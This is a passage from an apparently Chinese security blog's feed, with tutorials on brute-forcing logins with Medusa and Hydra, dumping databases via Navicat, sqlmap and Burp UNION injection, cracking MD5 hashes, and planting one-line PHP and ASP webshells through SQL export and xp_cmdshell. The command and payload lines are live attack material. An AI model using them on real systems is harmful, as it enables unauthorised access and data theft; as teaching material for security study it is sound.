          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Medusa使用</title>
      <link href="/2022/04/23/Medusa/"/>
      <url>/2022/04/23/Medusa/</url>
      
        <content type="html"><![CDATA[<h1 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h1><h2 id="查看可使用的模块"><a href="#查看可使用的模块" class="headerlink" title="查看可使用的模块"></a>查看可使用的模块</h2><pre class="line-numbers language-none"><code class="language-none">medusa -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="显示指定模块的帮助信息"><a href="#显示指定模块的帮助信息" class="headerlink" title="显示指定模块的帮助信息"></a>显示指定模块的帮助信息</h2><pre class="line-numbers language-none"><code class="language-none">medusa -M 模块 -q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Medusa常用参数"><a href="#Medusa常用参数" class="headerlink" title="Medusa常用参数"></a>Medusa常用参数</h2><pre class="line-numbers language-none"><code class="language-none">-h目标主机名或IP地址-H包含目标主机名或IP地址的文件-u用户名-U用户名文件-p密码-P密码文件-C组合条目文件,格式为host:user:password-O日志信息文件-en:空密码探测 s:密码等同用户名探测 ns:空密码和密码等同用户名探测-M要执行的模块名(没有.mod扩展名)-m传递给模块的参数.(可传递多个参数，如:-m para1 -m para2)-d显示所有的模块名称-n使用非默认端口-s启用SSL-r重试间隔时间，默认为3s-t设置线程数量-L并行化，每个用户使用一个线程-f在发现第一个有效的用户名&#x2F;密码后停止破解-q显示模块的使用信息-v详细级别(0-6,默认为5)-w错误调试级别(0-10,默认为5)-V显示版本-Z继续扫描上一次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="medusa破解实例"><a href="#medusa破解实例" class="headerlink" title="medusa破解实例"></a>medusa破解实例</h2><h3 id="mysql破解"><a href="#mysql破解" class="headerlink" title="mysql破解"></a>mysql破解</h3><pre class="line-numbers language-none"><code class="language-none">medusa -h 192.168.1.1 -u root -P pass.txt -M mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="smbnt破解"><a href="#smbnt破解" class="headerlink" title="smbnt破解"></a>smbnt破解</h3><pre class="line-numbers language-none"><code class="language-none">medusa -h 192.168.1.1 -U user.txt -P pass.txt -e ns -M smbnt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="mssql破解"><a href="#mssql破解" class="headerlink" title="mssql破解"></a>mssql破解</h3><pre class="line-numbers language-none"><code class="language-none">medusa -h 192.168.1.1 -u sa -P pass.txt -t 5 -f -M mssql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ftp破解"><a href="#ftp破解" class="headerlink" title="ftp破解"></a>ftp破解</h3><pre class="line-numbers language-none"><code class="language-none">medusa -C comb.txt -M ftp注:comb.txt内容为192.168.1.1:user:pass192.168.1.2:user:192.168.1.1::passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ssh破解"><a href="#ssh破解" class="headerlink" title="ssh破解"></a>ssh破解</h3><pre class="line-numbers language-none"><code class="language-none">medusa -M ssh -H host.txt -U user.txt -p passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="输出日志信息文件"><a href="#输出日志信息文件" class="headerlink" title="输出日志信息文件"></a>输出日志信息文件</h2><pre class="line-numbers language-none"><code class="language-none">medusa -h 192.168.1.1 -u root -p password -t 5 -f -M mysql -O log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hydra使用</title>
      <link href="/2022/04/22/Hydra/"/>
      <url>/2022/04/22/Hydra/</url>
      
        <content type="html"><![CDATA[<h1 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h1><h2 id="hydra常用参数"><a href="#hydra常用参数" class="headerlink" title="hydra常用参数"></a>hydra常用参数</h2><pre class="line-numbers language-none"><code class="language-none">-R继续从上一次的进度开始破解-S  采用SSL连接-s如果非默认端口，可通过该参数指定-l使用指定的用户名-L使用指定的用户名字典-p使用指定的密码-P  使用指定的密码字典-en:空密码试探 s:密码等同用户名试探 r:密码等同反向用户名试探-C使用冒号分割格式的文件，例：“户名:密码”，代替-L&#x2F;-P参数-M要攻击的目标(服务器)列表文件，每行一个条目，&#39;:&#39;指定端口-o指定结果输出文件-f破解出一个用户名和密码时立刻终止破解(只破解一个账号密码)-t设置运行的线程数，默认为16-w设置最大超时时间，单位为s,默认为32s-v显示详细信息-V每次尝试都显示login+passserver指定要攻击的目标，可以是IPv4地址、IPv6地址或域名service指定要破解的服务。当前支持的服务有:adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hydra破解实例"><a href="#hydra破解实例" class="headerlink" title="hydra破解实例"></a>hydra破解实例</h2><h3 id="破解Mysql密码"><a href="#破解Mysql密码" class="headerlink" title="破解Mysql密码"></a>破解Mysql密码</h3><pre class="line-numbers language-none"><code class="language-none">hydra -L user.txt -P pass.txt 192.168.1.1 mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="破解FTP密码"><a href="#破解FTP密码" class="headerlink" title="破解FTP密码"></a>破解FTP密码</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l admin -P pass.txt -t 32 192.168.1.1 ftp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="破解ssh"><a href="#破解ssh" class="headerlink" title="破解ssh"></a>破解ssh</h3><pre class="line-numbers language-none"><code class="language-none">hydra -L user.txt -P pass.txt -e n -vV 192.168.1.1 ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="破解RDP"><a href="#破解RDP" class="headerlink" title="破解RDP"></a>破解RDP</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l administrator -P pass.txt www.xxser.com rdp -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="破解POP3"><a href="#破解POP3" class="headerlink" title="破解POP3"></a>破解POP3</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l root -P pass.txt my.pop3.mail pop3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>拖库</title>
      <link href="/2022/04/02/%E6%8B%96%E5%BA%93/"/>
      <url>/2022/04/02/%E6%8B%96%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h1><h2 id="拖库定义"><a href="#拖库定义" class="headerlink" title="拖库定义"></a>拖库定义</h2><p>拖库指数据库中数据的导出操作</p><h2 id="拖库方法"><a href="#拖库方法" class="headerlink" title="拖库方法"></a>拖库方法</h2><h3 id="数据库支持外连接-允许客户端网络连接数据库"><a href="#数据库支持外连接-允许客户端网络连接数据库" class="headerlink" title="数据库支持外连接(允许客户端网络连接数据库)"></a>数据库支持外连接(允许客户端网络连接数据库)</h3><h4 id="常见的数据库配置文件"><a href="#常见的数据库配置文件" class="headerlink" title="常见的数据库配置文件"></a>常见的数据库配置文件</h4><h5 id="ASP-NET"><a href="#ASP-NET" class="headerlink" title="ASP.NET"></a>ASP.NET</h5><p>web.config等</p><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><p>inc,db,fun等目录下的config.php,conn.php,web.php等</p><h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><p>properties文件(.properties)与xml文件(.xml)<br>一般保存在WEB-INF文件夹中</p><h4 id="Navicat导出数据-Navicat-premium支持多个主流数据库"><a href="#Navicat导出数据-Navicat-premium支持多个主流数据库" class="headerlink" title="Navicat导出数据(Navicat premium支持多个主流数据库)"></a>Navicat导出数据(Navicat premium支持多个主流数据库)</h4><p>前提:攻击者已经得到了服务器的数据库的账号密码，并且数据库支持外连接<br>打开navicat</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A41.png" class=""><p>点击连接按钮，选择sql server数据库</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A42.png" class=""><p>在常规选项卡中输入基本信息(连接名随意),其他选项卡自定义</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A43.png" class=""><p>点击确定，navicat主界面就会出现连接名的连接</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A44.png" class=""><p>点击该连接，就可以查看此用户权限范围内的数据库信息</p><h5 id="navicat导出表结构及数据-复制整张表"><a href="#navicat导出表结构及数据-复制整张表" class="headerlink" title="navicat导出表结构及数据(复制整张表)"></a>navicat导出表结构及数据(复制整张表)</h5><p>选择要导出的表，点击鼠标右键</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A45.png" class=""><p>点击转储SQL文件–&gt;结构和数据</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A46.png" class=""><p>选择要保存的位置，点击保存即可</p><h5 id="navicat导出表数据-只导出表数据，不导出表结构"><a href="#navicat导出表数据-只导出表数据，不导出表结构" class="headerlink" title="navicat导出表数据(只导出表数据，不导出表结构)"></a>navicat导出表数据(只导出表数据，不导出表结构)</h5><p>选择要导出的表，点击鼠标右键</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A47.png" class=""><p>点击导出向导</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A48.png" class=""><p>选择要导出的格式，点击下一步</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A49.png" class=""><p>设置导出的路径，点击下一步</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A410.png" class=""><p>设置要导出的列，点击下一步</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A411.png" class=""><p>自定义选项内容，然后点击下一步</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A412.png" class=""><p>点击开始按钮即可导出表中的数据</p><h3 id="数据库不支持外连接-只允许本地操作数据库"><a href="#数据库不支持外连接-只允许本地操作数据库" class="headerlink" title="数据库不支持外连接(只允许本地操作数据库)"></a>数据库不支持外连接(只允许本地操作数据库)</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>前提:网站存在SQL注入漏洞，并可以利用</p><h5 id="Sqlmap导出数据"><a href="#Sqlmap导出数据" class="headerlink" title="Sqlmap导出数据"></a>Sqlmap导出数据</h5><pre class="line-numbers language-command" data-language="command"><code class="language-command">sqlmap.py -u &quot;http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;1&quot; -D &quot;user&quot; -T &quot;users&quot; -C &quot;id,username,password&quot; --dump --csv-del&#x3D;&quot;|&quot; --output-dir&#x3D;&quot;c:\out&quot; --dump-format&#x3D;CSV --threads 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与导出数据有关的选项<br><code>--csv-del</code> 导出CSV格式时，列与列之间的分隔字符。默认为”,”<br><code>--output-dir</code> 导出的目录<br><code>--dump-format</code> 导出的格式。默认为CSV格式<br>注:导出的文件保存在<code>导出目录/网站/dump/数据库</code>目录下，例：c:\out\<a href="http://www.example.com/dump/user%E4%B8%8B">www.example.com\dump\user下</a></p><h5 id="Burp导出数据"><a href="#Burp导出数据" class="headerlink" title="Burp导出数据"></a>Burp导出数据</h5><ul><li><p>确定表结构</p><ul><li>确认数据库  <pre class="line-numbers language-command" data-language="command"><code class="language-command">sqlmap.py -u &quot;http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;1&quot; --current-db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>确认表  <pre class="line-numbers language-command" data-language="command"><code class="language-command">sqlmap.py -u &quot;http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;1&quot; -D &quot;user&quot; --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>确认列  <pre class="line-numbers language-command" data-language="command"><code class="language-command">sqlmap.py -u &quot;http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;1&quot; -D &quot;user&quot; -T &quot;users&quot; --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>确定表中数据的总数</p><pre class="line-numbers language-command" data-language="command"><code class="language-command">sqlmap.py -u &quot;http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;1&quot; -D &quot;user&quot; -T &quot;users&quot; --count<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>构造导出的SQL语句<br>导出数据时,一般都以ID为导出标准,因为在一个数据表中,一般会有<code>[*id]</code>作为表的唯一列标识(主键),因为这是数据库的三大范式之一,开发者、DBA都会遮循这个标准</p><ul><li>确定最后的主键ID数  <pre class="line-numbers language-command" data-language="command"><code class="language-command">sqlmap.py -u &quot;http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;1&quot; -D &quot;user&quot; --sql-query&#x3D;&quot;select uid from users order by uid desc limit 0,1;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  注:<code>desc</code>为降序，<code>desc limit 0,1</code>为最后一条<br>  将查询的结果(表中最后一个uid的值)与之前表中数据的总数作对比：如果表中数据的总数小于最后一个uid的值，就代表管理员可能删除了某些记录</li><li>构造导出的SQL语句  <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7c</span><span class="token punctuation">,</span>uid<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> uid<span class="token operator">=</span><span class="token number">100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>使用burp intruder模块导出数据<br>将构造的SQL语句的URL加载到burp intruder模块,并将uid的值设为变量</p><pre class="line-numbers language-command" data-language="command"><code class="language-command">http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;-1 union all select null,null,concat(0x7c,uid,0x7e,username,0x5e,password) from users where uid&#x3D;100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A413.png" class=""><p>设置payloads</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A414.png" class=""><p>设置options,选择Grep-Extract</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A415.png" class=""><p>点击add</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A416.png" class=""><p>在弹出的界面点击Fetch response，勾选正则匹配，在response中选取要抓取的内容，burp会根据选取的内容自动生成正则表达式</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A417.png" class=""><p>点击ok</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A418.png" class=""><p>如果需要抓取多个内容，重复以上步骤即可，下图即为抓取多个内容的正则表达式</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A419.png" class=""><p>选择Intruder–&gt; Start attack 开始导出抓取数据</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A420.png" class=""><p>导出完毕后就可以点击save–&gt; Results table进行保存<br>注：这种方法导出的数据中可能会有空白行，因为有些数据可能被管理员删除了。<br>可以使用SQL的分页技术解决空白行的问题：<br>MYSQL</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">limit</span> I<span class="token punctuation">,</span>N<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SQL SERVER</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> I<span class="token operator">+</span>N <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span> a <span class="token keyword">where</span> id <span class="token operator">not</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> I id <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ORACLE</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> t2<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> rownum r<span class="token punctuation">,</span>t1<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> t1 <span class="token keyword">where</span> rownum <span class="token operator">&lt;</span> N<span class="token punctuation">)</span> t2 <span class="token keyword">where</span> t2<span class="token punctuation">.</span>r <span class="token operator">></span> I<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>POSTGRESQL</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">limit</span> I <span class="token keyword">offset</span> N<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注:除了burp,其他可以导出数据的软件:火车头，八爪鱼</p></li></ul><h4 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h4><p>越权访问可以把当前表中某些列(页面显示数据的列)的数据全部遍历出来</p><h4 id="本地导出"><a href="#本地导出" class="headerlink" title="本地导出"></a>本地导出</h4><p>本地导出是指已经有网站的权限，攻击者向web服务器上传类似于“phpmyadmin”的在线数据库管理的“拖库脚本“。这类脚本非常小巧，是专门针对数据导出而写的脚本</p><h5 id="navicat-HTTP通道连接"><a href="#navicat-HTTP通道连接" class="headerlink" title="navicat HTTP通道连接"></a>navicat HTTP通道连接</h5><p>在navicat安装目录下有三个php文件，分别是<code>ntunnel_mysql.php</code>，<code>ntunnel_pgsql.php</code>,<code>ntunnel_sqlite.php</code>,分别支持对mysql,postgresql,sqlite数据库使用HTTP通道连接</p><img src="/2022/04/02/%E6%8B%96%E5%BA%93/http%E9%80%9A%E9%81%931.png" class=""><ul><li>使用方法<br>(假设目标是PHP+MYSQL）<br>将<code>ntunnel_mysql.php</code>上传到目标网站的根目录下(可以改名如:db.php)<br>打开navicat,点击连接–&gt;MySQL<img src="/2022/04/02/%E6%8B%96%E5%BA%93/http%E9%80%9A%E9%81%932.png" class="">点击HTTP选项卡<img src="/2022/04/02/%E6%8B%96%E5%BA%93/http%E9%80%9A%E9%81%933.png" class="">勾选<code>使用HTTP通道</code>,通道网址框中输入<code>ntunnel_mysql.php</code>的URL,其他默认即可<img src="/2022/04/02/%E6%8B%96%E5%BA%93/http%E9%80%9A%E9%81%934.png" class="">然后返回常规选项卡，填写连接名，用户名，密码，主机名必须为127.0.0.1或localhost(代表本地连接)<img src="/2022/04/02/%E6%8B%96%E5%BA%93/http%E9%80%9A%E9%81%935.png" class="">填写完后，即可远程连接MYSQL数据库</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MD5解密</title>
      <link href="/2022/04/01/MD5%E8%A7%A3%E5%AF%86/"/>
      <url>/2022/04/01/MD5%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="MD5解密"><a href="#MD5解密" class="headerlink" title="MD5解密"></a>MD5解密</h1><h2 id="彩虹表破解"><a href="#彩虹表破解" class="headerlink" title="彩虹表破解"></a>彩虹表破解</h2><h3 id="网上下载已有的彩虹表"><a href="#网上下载已有的彩虹表" class="headerlink" title="网上下载已有的彩虹表"></a>网上下载已有的彩虹表</h3><h3 id="使用工具生成彩虹表"><a href="#使用工具生成彩虹表" class="headerlink" title="使用工具生成彩虹表"></a>使用工具生成彩虹表</h3><p>RainbowCrack<br>Cain<br>…</p><h4 id="cain生成彩虹表"><a href="#cain生成彩虹表" class="headerlink" title="cain生成彩虹表"></a>cain生成彩虹表</h4><p>运行cain安装目录下的Winrtgen目录下的Winrtgen.exe</p><img src="/2022/04/01/MD5%E8%A7%A3%E5%AF%86/md51.png" class=""><p>运行结果如下</p><img src="/2022/04/01/MD5%E8%A7%A3%E5%AF%86/md52.png" class=""><p>点击Add Table按钮</p><img src="/2022/04/01/MD5%E8%A7%A3%E5%AF%86/md53.png" class=""><p>配置上图中的各项参数，点击ok按钮</p><img src="/2022/04/01/MD5%E8%A7%A3%E5%AF%86/md54.png" class=""><p>继续点击ok按钮，开始生成彩虹表文件</p><img src="/2022/04/01/MD5%E8%A7%A3%E5%AF%86/md55.png" class=""><p>生成的彩虹表文件保存在Winrtgen目录下</p><img src="/2022/04/01/MD5%E8%A7%A3%E5%AF%86/md56.png" class=""><h4 id="RainbowCrack破解MD5"><a href="#RainbowCrack破解MD5" class="headerlink" title="RainbowCrack破解MD5"></a>RainbowCrack破解MD5</h4><pre class="line-numbers language-command" data-language="command"><code class="language-command">rcrack.exe 彩虹表目录 -h 密文<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="MD5站点破解"><a href="#MD5站点破解" class="headerlink" title="MD5站点破解"></a>MD5站点破解</h2><p>国内外常见的MD5破解站点<br><a href="http://www.md5crack.com/home">http://www.md5crack.com/home</a><br><a href="http://www.netmd5crack.com/cracker">http://www.netmd5crack.com/cracker</a><br><a href="http://www.cmd5.com/">http://www.cmd5.com</a><br><a href="http://md5pass.info/">http://md5pass.info</a><br><a href="http://www.md5.hk/interface.asp">http://www.md5.hk/interface.asp</a><br><a href="http://www.md5decrypter.co.uk/">http://www.md5decrypter.co.uk</a><br><a href="http://www.md5this.com/index.php">http://www.md5this.com/index.php</a><br><a href="http://www.md5decrypter.com/">http://www.md5decrypter.com</a><br><a href="http://www.xmd5.org/">http://www.xmd5.org</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网站后台</title>
      <link href="/2022/03/28/%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0/"/>
      <url>/2022/03/28/%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="网站后台"><a href="#网站后台" class="headerlink" title="网站后台"></a>网站后台</h1><p>通过登陆网站后台获取webshell</p><h2 id="后台的模板更换功能"><a href="#后台的模板更换功能" class="headerlink" title="后台的模板更换功能"></a>后台的模板更换功能</h2><h2 id="后台的文件管理功能"><a href="#后台的文件管理功能" class="headerlink" title="后台的文件管理功能"></a>后台的文件管理功能</h2><h2 id="后台的SQL语句执行功能"><a href="#后台的SQL语句执行功能" class="headerlink" title="后台的SQL语句执行功能"></a>后台的SQL语句执行功能</h2><p>如果数据库用户权限较大，就可以通过SQL语句导出webshell</p><h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> x <span class="token punctuation">(</span>cmd <span class="token keyword">text</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> x <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'&lt;?php @eval($_POST[666]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> cmd <span class="token keyword">from</span> x <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'F:/php/htdocs/phpMyAdmin/shell.php'</span><span class="token punctuation">;</span><span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span> x<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php @eval($_POST[txjg]);?>'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'c:/xxxx/shell.php'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注:mysql数据库用户应有文件读写权限</p><h3 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> cmd <span class="token punctuation">(</span>a <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> cmd <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'一句话木马'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">into</span> <span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">in</span> <span class="token string">'c:/xxx/6.asa;x.xls'</span> <span class="token string">'excel 80;'</span> <span class="token keyword">from</span> cmd<span class="token punctuation">;</span><span class="token keyword">drop</span> <span class="token keyword">table</span> cmd<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'代码'</span> <span class="token keyword">into</span> <span class="token punctuation">[</span>excel <span class="token number">5.0</span><span class="token punctuation">;</span>hdr<span class="token operator">=</span>yes<span class="token punctuation">;</span><span class="token keyword">database</span><span class="token operator">=</span>c:<span class="token operator">/</span><span class="token number">6.</span>asp<span class="token punctuation">;</span>x<span class="token punctuation">.</span>xls<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token string">'xxx'</span><span class="token punctuation">]</span> <span class="token keyword">from</span> 表；<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;%execute request(chr(35))%>'</span> <span class="token keyword">into</span> <span class="token punctuation">[</span>xxser<span class="token punctuation">]</span> <span class="token operator">in</span> <span class="token string">'c:/xxx/6.asp;.xls'</span> <span class="token string">'excel 5.0;'</span> <span class="token keyword">from</span> 表<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注:Access导出shell只能配合IIS 6的解析漏洞；<br>如果导出asp格式，将会提示”不能更新，数据库或对象为只读”</p><h3 id="Sql-server"><a href="#Sql-server" class="headerlink" title="Sql server"></a>Sql server</h3><p>sql server没有提供直接导出数据的语句，但可以通过xp_cmdshell导出</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'echo ^&lt;% eval request("chopper")%>^ > c:\1.txt'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：使用xp_cmdshell存储过程可以调用系统命令</p><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> cmd <span class="token punctuation">(</span>a nvarchar2<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> cmd <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">create</span> directory dir_dump <span class="token 